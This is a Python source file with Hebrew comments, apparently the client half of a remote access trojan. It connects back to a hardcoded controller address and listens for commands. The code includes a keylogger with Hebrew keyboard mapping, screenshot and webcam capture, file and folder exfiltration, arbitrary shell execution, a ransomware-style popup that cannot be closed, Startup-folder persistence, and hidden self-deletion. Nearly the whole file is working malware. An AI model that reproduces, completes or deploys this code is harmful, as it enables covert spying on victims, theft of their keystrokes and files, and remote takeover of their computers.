import os
import socket
import subprocess
import shutil
import sys
import time
from PIL import ImageGrab  # <-- השינוי הגדול: משתמשים בזה במקום ב-pyautogui
import io
import struct
import cv2
import keyboard  # הספרייה החדשה
import threading  # לניהול המקביליות
import platform  # מידע על מערכת הפעלה\מחשב
import webbrowser  # פותח דפדפן
import ctypes  # פתיחת חלון למשתשמש
import tkinter as tk  # ספרייה ליצירת חלונות מותאמים אישית

# --- הגדרות ---
TARGET_IP = "10.100.102.9"
TARGET_PORT = 9998

# --- משתנים גלובליים לניהול שפה וטקסט ---
keylog_storage = ""  # פה נשמר הטקסט הנקי
is_hebrew_mode = False  # האם אנחנו כרגע במצב עברית?

# --- המילון: המרת מקלדת אנגלית לעברית ---
ENG_TO_HEB = {
    'q': '/', 'w': "'", 'e': 'ק', 'r': 'ר', 't': 'א', 'y': 'ט', 'u': 'ו', 'i': 'ן', 'o': 'ם', 'p': 'פ',
    'a': 'ש', 's': 'ד', 'd': 'ג', 'f': 'כ', 'g': 'ע', 'h': 'י', 'j': 'ח', 'k': 'ל', 'l': 'ך', ';': 'ף',
    'z': 'ז', 'x': 'ס', 'c': 'ב', 'v': 'ה', 'b': 'נ', 'n': 'מ', 'm': 'צ', ',': 'ת', '.': 'ץ', '/': '.'
}


def keylogger_engine():
    global keylog_storage
    global is_hebrew_mode

    def on_key_event(event):
        global keylog_storage
        global is_hebrew_mode

        try:  # <--- הוספנו הגנה: שום דבר פה לא יקריס את התוכנה
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name

                # --- תיקון 1: זיהוי קיצורי דרך (Ctrl/Alt + מקש) ---
                if keyboard.is_pressed('ctrl'):
                    if key in ['ctrl', 'right ctrl', 'left ctrl']: return
                    keylog_storage += f"[Ctrl+{key}]"
                    return

                if keyboard.is_pressed('alt') and key not in ['shift', 'right shift']:
                    if key in ['alt', 'right alt', 'left alt']: return
                    keylog_storage += f"[Alt+{key}]"
                    return

                # --- תיקון 2: החלפת שפה ---
                if (key == 'shift' and keyboard.is_pressed('alt')) or \
                        (key == 'alt' and keyboard.is_pressed('shift')):
                    is_hebrew_mode = not is_hebrew_mode
                    return

                # --- מקשים מיוחדים רגילים ---
                if key == 'space':
                    keylog_storage += " "
                elif key == 'enter':
                    keylog_storage += "\n"
                elif key == 'backspace':
                    keylog_storage = keylog_storage[:-1]
                elif key in ['shift', 'caps lock', 'tab', 'right shift', 'up', 'down', 'left', 'right']:
                    pass

                    # --- כתיבת אותיות ---
                elif len(key) == 1:
                    char_to_add = key
                    # תרגום לעברית רק אם המצב פעיל
                    if is_hebrew_mode:
                        # שימוש ב-get מונע קריסה אם המקש לא במילון
                        char_to_add = ENG_TO_HEB.get(key.lower(), key)

                    keylog_storage += char_to_add

                else:
                    pass

        except Exception as e:
            # אם יש שגיאה, נדפיס אותה אצלך אבל הלקוח לא יקרוס!
            print(f"Keylogger Error (Ignored): {e}")

    # הפעלת ההאזנה
    keyboard.hook(on_key_event)


def become_persistent():
    """ מעתיק את הקובץ ל-Startup """
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)

        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        base_name = os.path.basename(current_file)
        destination = os.path.join(startup_folder, base_name)

        if not os.path.exists(destination):
            shutil.copy2(current_file, destination)
    except Exception:
        pass


def send_data(sock, data):
    """ שולח מידע עם הפרדה ברורה למניעת תקיעות (גודל + תוכן) """
    if isinstance(data, str):
        data = data.encode('utf-8')

    data_len = len(data)
    # אריזת הגודל (4 בייטים)
    header = struct.pack('>I', data_len)

    # 1. שליחת הגודל
    sock.sendall(header)

    # 2. עצירה קטנטנה כדי שהשרת יספיק לעכל את הגודל
    # זה מונע את ה"הדבקה" של הגודל והתוכן ביחד
    time.sleep(0.05)

    # 3. שליחת התוכן
    sock.sendall(data)


# -------
def send_file_to_server(sock, filename):
    """
        פונקציה  אחראית על שליחת קובץ מהמחשב (לקוח) אל השרת (לשרת).
        """
    if os.path.exists(filename):
        try:
            with open(filename, 'rb') as f:
                file_data = f.read()

            # שימוש ב-send_data החדש
            send_data(sock, file_data)
            return True
        except Exception as e:
            send_data(sock, f"Error sending file: {e}")
            return False
    else:
        send_data(sock, "ERR: File not found")
        return False


def start_client():
    global keylog_storage

    # --- הפעלת ה-Keylogger ברקע ---
    # אנחנו מפעילים אותו מיד עם תחילת התוכנית
    print("[*] Starting Keylogger in background...")
    keylogger_engine()

    while True:
        try:
            my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            my_socket.connect((TARGET_IP, TARGET_PORT))

            while True:
                # עדכון: הוספנו strip() וטיפול בשגיאות כדי למנוע קריסה מרווחים
                try:
                    command = my_socket.recv(1024).decode(errors='ignore').strip()
                except:
                    break

                if not command:
                    break

                if command.lower() == "exit":
                    my_socket.close()
                    return

                # --- משיכת הלוגים (החדש!) ---
                if command.lower() == "get_keys":
                    try:
                        if keylog_storage:
                            # שולח את מה שנצבר
                            response = f"\n--- Keylog Dump ---\n{keylog_storage}\n-------------------"
                            send_data(my_socket, response)
                            # מאפס את הזיכרון אחרי השליחה
                            keylog_storage = ""
                        else:
                            send_data(my_socket, "No keys recorded yet.")
                    except Exception as e:
                        send_data(my_socket, f"Error getting keys: {str(e)}")
                    continue  # חובה! מונע הרצת הפקודה ב-CMD

                # --- טיפול בצילום מסך  ---
                elif command.lower() == "screenshot":
                    try:
                        # שימוש ב-ImageGrab
                        screenshot = ImageGrab.grab()

                        # שמירה לזיכרון
                        img_byte_arr = io.BytesIO()
                        screenshot.save(img_byte_arr, format='PNG')

                        # שליחה
                        img_data = img_byte_arr.getvalue()
                        send_data(my_socket, img_data)

                    except Exception as e:
                        error_msg = f"Error taking screenshot: {str(e)}"
                        send_data(my_socket, error_msg)
                    continue  # חובה! מונע הרצת הפקודה ב-CMD

                # --- צילום מצלמה  ---
                if command.lower() == "cam":
                    try:
                        # 1. פתיחת המצלמה (עם תיקון לקריסות DSHOW)
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                        if not cap.isOpened():
                            send_data(my_socket, "Error: Webcam not found")
                            continue  # חובה להמשיך מכאן אם נכשל

                        # 2. קריאת תמונה
                        ret, frame = cap.read()
                        cap.release()

                        if not ret:
                            send_data(my_socket, "Error: Failed to capture frame")
                            continue

                        # 3. המרה ל-JPG בזיכרון (יעיל יותר מ-PNG לתמונות)
                        # הפונקציה imencode מחזירה בוליאני ומערך בייטים
                        success, buffer = cv2.imencode('.jpg', frame)

                        if success:
                            # 4. שליחת הבייטים לשרת
                            send_data(my_socket, buffer.tobytes())
                        else:
                            send_data(my_socket, "Error: Failed to encode image")

                    except Exception as e:
                        error_msg = f"Cam Error: {str(e)}"
                        send_data(my_socket, error_msg)

                    continue  # <--- התיקון החשוב ביותר! מונע מהמחשב לנסות להריץ את "cam" כפקודה

                # --- הורדת קבצים ושליחה לשרת ---
                if command.lower().startswith("download "):
                    path_to_file = command[9:].strip()
                    send_file_to_server(my_socket, path_to_file)
                    continue  # חובה!

                # --- פקודה לדחיסת תיקייה ---
                if command.lower().startswith("zip "):
                    try:
                        folder_to_zip = command[4:].strip()

                        if os.path.isdir(folder_to_zip):
                            # יצירת קובץ ZIP
                            # הפונקציה יוצרת קובץ בשם folder_to_zip.zip
                            shutil.make_archive(folder_to_zip, 'zip', folder_to_zip)

                            response = f"[+] Folder zipped successfully! You can now download '{folder_to_zip}.zip'"
                        else:
                            response = "[-] Error: Not a folder or directory not found."

                    except Exception as e:
                        response = f"[-] Zip Error: {str(e)}"

                    send_data(my_socket, response)
                    continue  # חובה!

                # --- השמדה עצמית (Uninstall) שקטה ---
                if command.lower() == "terminate_all":
                    try:
                        # 1. מחיקה מ-Startup (כדי שלא יעלה שוב)
                        startup_folder = os.path.join(os.getenv('APPDATA'),
                                                      r'Microsoft\Windows\Start Menu\Programs\Startup')

                        # זיהוי אם אנחנו רצים כ-EXE או כ-Script
                        if getattr(sys, 'frozen', False):
                            current_file = sys.executable
                        else:
                            current_file = os.path.abspath(__file__)

                        base_name = os.path.basename(current_file)
                        startup_file = os.path.join(startup_folder, base_name)

                        if os.path.exists(startup_file):
                            os.remove(startup_file)

                        # 2. הכנת פקודת ההתאבדות (מחכה 3 שניות ואז מוחקת)
                        destruct_cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{current_file}"'

                        # --- החלק שהופך את זה לשקט לגמרי (Stealth) ---
                        si = subprocess.STARTUPINFO()
                        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                        # מריץ את הפקודה עם ההגדרות המוסתרות (startupinfo=si)
                        subprocess.Popen(destruct_cmd, shell=True, startupinfo=si)

                        # 3. הודעת פרידה וסגירה
                        send_data(my_socket, "[!] Self-destruct initiated. Goodbye.")
                        my_socket.close()
                        sys.exit(0)  # סגירה מידית כדי לשחרר את הקובץ למחיקה

                    except Exception as e:
                        send_data(my_socket, f"[-] Error self-destruct: {str(e)}")
                    continue

                    # --- מידע על מחשב\מערכת הפעלה של הלקוח ---
                if command.lower() == "sysinfo":
                    info = f"""
                                    --- System Info ---
                                    OS: {platform.system()}
                                    Version: {platform.version()}
                                    Machine: {platform.machine()}
                                    Processor: {platform.processor()}
                                    User: {os.getlogin()}
                                    """
                    send_data(my_socket, info)
                    continue

                # --- הודעה נעולה (Ransomware Style Note) ---
                if command.lower().startswith("msgbox "):
                    message = command[7:].strip()

                    def show_locked_popup():
                        try:
                            root = tk.Tk()
                            root.title("System Alert")

                            # הגדרת גודל ומיקום (באמצע המסך בערך)
                            root.geometry("400x250+500+300")

                            # --- הקסם: ביטול המסגרת וה-X ---
                            root.overrideredirect(True)

                            # --- החלון תמיד יהיה מעל כולם ---
                            root.attributes("-topmost", True)

                            # עיצוב ההודעה (רקע אדום, טקסט לבן - נראה מלחיץ)
                            root.configure(bg='#8B0000')  # אדום כהה

                            label = tk.Label(root, text=message, font=("Arial", 14, "bold"),
                                             bg='#8B0000', fg='white', wraplength=350)
                            label.pack(expand=True, pady=20)

                            warning = tk.Label(root, text="(Wait 60 seconds to close)", font=("Arial", 10),
                                               bg='#8B0000', fg='yellow')
                            warning.pack(pady=5)

                            # הפונקציה שתשחרר את החלון אחרי דקה
                            def unlock_window():
                                # צליל מערכת (אופציונלי)
                                print('\a')
                                # יצירת כפתור סגירה
                                btn = tk.Button(root, text="CLOSE", command=root.destroy,
                                                font=("Arial", 12, "bold"), bg="white", fg="black", width=15)
                                btn.pack(pady=20)
                                warning.config(text="You can now close this window.")

                            # הפעלת הטיימר: 60,000 מילישניות = 60 שניות
                            root.after(60000, unlock_window)

                            root.mainloop()
                        except Exception:
                            pass

                    # הרצה ב-Thread נפרד כדי לא לתקוע את השרת
                    t = threading.Thread(target=show_locked_popup)
                    t.start()

                    send_data(my_socket, "[+] Locked popup displayed. User cannot close it for 60s.")
                    continue

                # --- גורמת לדפדפן של הלקוח להיפתח בפתאומיות בכתובת שאתה בוחר ---
                if command.lower().startswith("openurl "):
                    url = command[8:].strip()
                    # פתיחת הדפדפן (עובד גם אם הדפדפן סגור)
                    webbrowser.open(url)
                    send_data(my_socket, f"[+] Opened URL: {url}")
                    continue

                # --- שאר הפקודות ---
                if command.lower().startswith("cd "):
                    try:
                        path_to_go = command[3:].strip()
                        os.chdir(path_to_go)
                        response = f"Changed directory to: {os.getcwd()}"
                    except Exception as e:
                        response = str(e)
                    send_data(my_socket, response)
                    continue

                # --- הרצת פקודות CMD (רק אם זה לא אף אחת מהפקודות המיוחדות למעלה) ---
                command_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = command_process.communicate()

                # המרה לטקסט בטוח ומניעת קריסות עברית
                try:
                    res = output.decode('cp1255') + error.decode('cp1255')
                except:
                    res = output.decode('utf-8', errors='ignore') + error.decode('utf-8', errors='ignore')

                if not res:
                    res = "Command executed successfully (no output)"

                send_data(my_socket, res)


        except Exception as e:

            print("\n\n")

            print("X" * 50)

            print(f"   THE REASON FOR FAILURE: {e}")

            print("X" * 50)

            print("\n\n")

            time.sleep(5)


if __name__ == '__main__':
    # become_persistent()
    start_client()